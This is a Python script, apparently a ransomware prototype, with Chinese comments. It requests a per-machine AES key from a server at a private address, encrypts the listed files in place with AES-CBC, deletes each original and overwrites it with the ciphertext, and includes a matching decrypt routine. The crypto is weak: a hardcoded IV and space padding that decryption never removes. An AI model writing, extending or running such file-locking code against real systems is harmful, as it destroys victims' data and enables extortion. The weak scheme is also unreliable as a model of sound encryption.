# coding : utf-8

import uuid
import requests
import rsa
from rsa import core
from Crypto.Cipher import AES
import os
from rich import print as print
import base64
import sys


# 定义初始化向量
iv = b"16-byte-iv-56789"

def enc_init():
    # 初始化==============================================

    # 生成唯一uuid
    uid = uuid.uuid4()
    
    # 使用本机uuid向服务器获取使用根密钥加密的密钥，用于第一次加密
    aes_key = requests.post("http://192.168.114.1:5000/getKey", data={"uuid": uid}).json()

    if aes_key['status'] != 'create':
        sys.exit(1)

    return uid, base64.b64decode(aes_key['data'])


def encrypt(file_paths: list[str], aes_key):
    for file in file_paths:

        tmp_file_path = file + '_encrypted'
        encrypt_file(file, tmp_file_path, aes_key)
        os.remove(file)
        os.rename(tmp_file_path, file)

        
        print("加密完成：" + file)


# 加密函数
def encrypt_file(input_file_path, output_file_path, key):
    cipher = AES.new(key, AES.MODE_CBC, iv)
    with open(input_file_path, "rb") as input_file:
        with open(output_file_path, "wb") as output_file:
            # # 写入IV（初始化向量）
            # output_file.write(iv)
            # 加密文件内容
            while True:
                chunk = input_file.read(16 * 1024)
                if len(chunk) == 0:
                    break
                elif len(chunk) % 16 != 0:
                    # 如果数据块不是16的倍数，则填充0x00
                    chunk += b" " * (16 - len(chunk) % 16)
                output_file.write(cipher.encrypt(chunk))


# 解密函数
def decrypt_file(input_file_path, output_file_path, key):
    with open(input_file_path, "rb") as input_file:
        # # 读取IV
        # iv = input_file.read(16)
        cipher = AES.new(key, AES.MODE_CBC, iv)
        with open(output_file_path, "wb") as output_file:
            # 解密文件内容
            while True:
                chunk = input_file.read(16 * 1024)
                if len(chunk) == 0:
                    break
                output_file.write(cipher.decrypt(chunk))

